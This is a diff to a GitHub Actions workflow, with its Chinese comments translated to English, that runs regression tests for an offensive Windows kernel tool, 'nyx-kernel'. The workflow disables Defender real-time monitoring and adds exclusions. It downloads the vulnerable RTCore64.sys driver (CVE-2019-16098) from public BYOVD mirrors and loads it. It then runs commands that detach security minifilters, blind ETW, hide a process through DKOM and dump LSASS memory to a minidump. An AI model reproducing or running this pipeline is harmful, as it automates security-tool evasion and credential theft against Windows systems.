@@ -46,48 +46,50 @@ jobs:
       - uses: actions/checkout@v4
 
       # ---- 0. 关键前置:探测 HVCI / 黑名单 / Defender 状态 ----
+      # 用 pwsh (PowerShell 7, UTF-8 aware) 避免 PS 5.1 对 em-dash / 中文
+      # 注释的编码崩溃(首次 push 在 PS 5.1 下因 mojibake 解析失败)。
       - name: Probe HVCI + vulnerable driver blocklist + Defender status
         id: probe
-        shell: powershell
+        shell: pwsh
         run: |
           Write-Host "=== OS build ==="
           $os = Get-CimInstance Win32_OperatingSystem
           Write-Host "OS: $($os.Caption) build $($os.BuildNumber)"
 
-          Write-Host "=== Win32_DeviceGuard / VBS / HVCI 状态 ==="
+          Write-Host "=== Win32_DeviceGuard / VBS / HVCI status ==="
           $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
           if ($dg) {
             $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
             $hvci_running = ($dg.SecurityServicesRunning -contains 2)
           } else {
-            Write-Host "Win32_DeviceGuard 不可用(老 build 或无 VBS)— 视为 HVCI off"
+            Write-Host "Win32_DeviceGuard unavailable (old build or no VBS) - treat as HVCI off"
             $hvci_running = $false
           }
 
-          Write-Host "=== Vulnerable Driver Blocklist 注册表 ==="
+          Write-Host "=== Vulnerable Driver Blocklist registry ==="
           $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
-          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, 空=未设置)"
+          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, empty=unset)"
 
-          Write-Host "=== Defender 状态 ==="
+          Write-Host "=== Defender status ==="
           $def = Get-MpComputerStatus -ErrorAction SilentlyContinue
           if ($def) {
             Write-Host "Defender AMRunningMode=$($def.AMRunningMode) RTP=$($def.RealTimeProtectionEnabled)"
           } else {
-            Write-Host "Defender 未安装或不可用(hosted runner image 默认关)"
+            Write-Host "Defender not installed/unavailable (hosted runner image default off)"
           }
 
-          Write-Host "=== 管理员权限验证 ==="
+          Write-Host "=== Admin privilege check ==="
           $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
           Write-Host "Running as Administrator: $isAdmin"
 
-          Write-Host "=== 判定 ==="
+          Write-Host "=== Decision ==="
           Write-Host "HVCI actively running: $hvci_running"
           if ($hvci_running) {
-            Write-Host "::warning::HVCI is running — RTCore64.sys (在黑名单里) 加载会被挡。跳过 BYOVD job。"
-            echo "skip=true" >> $env:GITHUB_OUTPUT
+            Write-Host "::warning::HVCI is running - RTCore64.sys load will be blocked. Skipping BYOVD job."
+            "skip=true" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
           } else {
-            Write-Host "::notice::HVCI NOT running — RTCore64.sys 加载应该成功(合法签名 + 黑名单不强制)。"
-            echo "skip=false" >> $env:GITHUB_OUTPUT
+            Write-Host "::notice::HVCI NOT running - RTCore64.sys load should succeed (signed + blocklist not enforced without HVCI)."
+            "skip=false" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
           }
 
       - name: Skip — HVCI blocks BYOVD
@@ -97,7 +99,7 @@ jobs:
       # ---- 1. Defender 双保险(只在 HVCI 关时执行)----
       - name: Disable Defender + add exclusions
         if: steps.probe.outputs.skip == 'false'
-        shell: powershell
+        shell: pwsh
         run: |
           Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
           Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue
@@ -110,13 +112,13 @@ jobs:
         if: steps.probe.outputs.skip == 'false'
         shell: pwsh
         run: |
-          # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098)。
-          # 公开 PoC 驱动,从公开 BYOVD 集合下载。文件不进 git(在 target/,
-          # 已 gitignore),不随 artifact 上传。
+          # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098).
+          # Public PoC driver, fetched from a public BYOVD collection. Not committed
+          # to git (in target/, gitignored), not uploaded as artifact.
           $driverDir = New-Item -ItemType Directory -Force -Path "target\drivers"
           $driverPath = Join-Path $driverDir.FullName "RTCore64.sys"
 
-          # 尝试多个公开镜像(任一可用即可)
+          # Try multiple public mirrors (any one working is enough)
           $mirrors = @(
             "https://github.com/BlackSnufkin/BYOVD/raw/main/DumpDrivers/RTCore64.sys",
             "https://github.com/zer0condition/BYOVD/raw/main/VulnerableDrivers/RTCore64.sys",
@@ -125,20 +127,20 @@ jobs:
           $got = $false
           foreach ($url in $mirrors) {
             try {
-              Write-Host "尝试下载: $url"
+              Write-Host "trying: $url"
               Invoke-WebRequest -Uri $url -OutFile $driverPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
               $sz = (Get-Item $driverPath).Length
               if ($sz -gt 10000) {
-                Write-Host "::notice::下载成功: $driverPath ($sz bytes)"
+                Write-Host "::notice::downloaded: $driverPath ($sz bytes)"
                 $got = $true
                 break
               }
             } catch {
-              Write-Host "  失败: $($_.Exception.Message)"
+              Write-Host "  failed: $($_.Exception.Message)"
             }
           }
           if (-not $got) {
-            Write-Host "::error::所有镜像都失败 — 手动放 RTCore64.sys 到 target/drivers/ 后重试"
+            Write-Host "::error::all mirrors failed - manually place RTCore64.sys in target/drivers/ and retry"
             exit 1
           }
           echo "DRIVER_PATH=$driverPath" >> $env:GITHUB_ENV
@@ -160,28 +162,28 @@ jobs:
           echo BUILD_OK
 
       # ---- 4. BYOVD 真机回归(对应 M6 Task G-K + P0.a/b + P3.b)----
-      - name: BYOVD bootstrap + kernelsdk 全路径
+      - name: BYOVD bootstrap + kernelsdk full path
         if: steps.probe.outputs.skip == 'false'
         shell: cmd
-        continue-on-error: true   # 个别 IOCTL 可能因 Defender 版本差异失败,不挂
+        continue-on-error: true   # individual IOCTLs may fail by Defender version; do not fail job
         run: |
-          REM ---- Task G: BYOVD 驱动加载 ----
+          REM ---- Task G: BYOVD driver load ----
           echo === Task G: BYOVD bootstrap ===
           crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --byovd "%DRIVER_PATH%" NyaRTCore
           echo BOOTSTRAP_EXIT=%ERRORLEVEL%
           if %ERRORLEVEL% NEQ 0 (
-            echo ::warning::bootstrap 失败 — 可能 Defender 版本挡了 driver load
+            echo ::warning::bootstrap failed - Defender version may block driver load
             exit /b 0
           )
 
           REM ---- P0.a: PatchGuard window ----
           echo === P0.a: PatchGuard window select ===
-          REM pg-window 阻塞等 ENTER,这里只验证 select_pg_window 不崩;
-          REM 用 echo 模拟 ENTER 让它立即 Drop 退出。
+          REM pg-window blocks waiting for ENTER; here we only verify select_pg_window does not crash;
+          REM pipe echo to simulate ENTER so it Drops and exits immediately.
           echo. | crates\operator-kernel-cli\target\release\nyx-kernel.exe pg-window
           echo PG_WINDOW_EXIT=%ERRORLEVEL%
 
-          REM ---- P0.b: MiniFilter detach(build 表自动 fallback,无需 --flt-rva)----
+          REM ---- P0.b: MiniFilter detach (build table auto fallback, no --flt-rva needed)----
           echo === P0.b: MiniFilter detach ===
           crates\operator-kernel-cli\target\release\nyx-kernel.exe detach-minifilter
           echo MINIFILTER_EXIT=%ERRORLEVEL%
@@ -191,9 +193,9 @@ jobs:
           crates\operator-kernel-cli\target\release\nyx-kernel.exe blind-etw
           echo BLIND_ETW_EXIT=%ERRORLEVEL%
 
-          REM ---- Task I: DKOM hide(隐藏自己)----
+          REM ---- Task I: DKOM process hide ----
           echo === Task I: DKOM process hide ===
-          REM 用 explorer.exe 的 PID 做可见性测试(隐藏后立即 unhid 不影响系统)
+          REM Use explorer.exe PID for visibility test (hide then it stays hidden; harmless on CI runner)
           for /f "tokens=2" %%p in ('tasklist /fi "imagename eq explorer.exe" /nh') do (
             crates\operator-kernel-cli\target\release\nyx-kernel.exe hide %%p
             echo HIDE_EXIT=%ERRORLEVEL%
@@ -201,7 +203,7 @@ jobs:
           )
           :hide_done
 
-          REM ---- P3.b: LSASS dump(minidump 装配)----
+          REM ---- P3.b: LSASS dump (minidump assemble)----
           echo === P3.b: LSASS kernel read + minidump assemble ===
           for /f "tokens=2" %%p in ('tasklist /fi "imagename eq lsass.exe" /nh') do (
             crates\operator-kernel-cli\target\release\nyx-kernel.exe dump-lsass %%p
@@ -210,9 +212,9 @@ jobs:
           )
           :dump_done
 
-          REM ---- 验证 minidump 文件存在 ----
-          echo === 验证 minidump 文件存在 ===
-          dir lsass_*.dmp 2>nul || echo 无 dmp 文件(dump_lsass 可能未跑通)
+          REM ---- Verify minidump file exists ----
+          echo === Verify minidump file ===
+          dir lsass_*.dmp 2>nul || echo no dmp file (dump_lsass may not have completed)
 
       # ---- 5. minidump 文件格式验证(P3.a 产物)----
       - name: Verify minidump file format
@@ -222,18 +224,18 @@ jobs:
         run: |
           $dmp = Get-ChildItem -Path . -Filter "lsass_*.dmp" -ErrorAction SilentlyContinue | Select-Object -First 1
           if (-not $dmp) {
-            Write-Host "::warning::无 lsass_*.dmp — dump-lsass 未产出(可能 IOCTL 路径失败)"
+            Write-Host "::warning::no lsass_*.dmp - dump-lsass produced no output (IOCTL path may have failed)"
             return
           }
           Write-Host "minidump: $($dmp.Name) ($($dmp.Length) bytes)"
-          # 验证 MDMP magic(4D 44 4D 50)
+          # Verify MDMP magic (4D 44 4D 50)
           $bytes = [IO.File]::ReadAllBytes($dmp.FullName)[0..3]
           $magic = [System.Text.Encoding]::ASCII.GetString($bytes)
-          Write-Host "magic: $magic (期望 MDMP)"
+          Write-Host "magic: $magic (expected MDMP)"
           if ($magic -ne "MDMP") {
-            Write-Host "::warning::magic 不是 MDMP — minidump 装配器或 dump_lsass 有问题"
+            Write-Host "::warning::magic is not MDMP - minidump assembler or dump_lsass issue"
           } else {
-            Write-Host "::notice::minidump 格式正确(MDMP magic) — P3.a + P3.b 端到端通过"
+            Write-Host "::notice::minidump format correct (MDMP magic) - P3.a + P3.b end-to-end pass"
           }
 
       # ---- 6. 上传诊断(不含 RTCore64.sys,避免 ToS)----
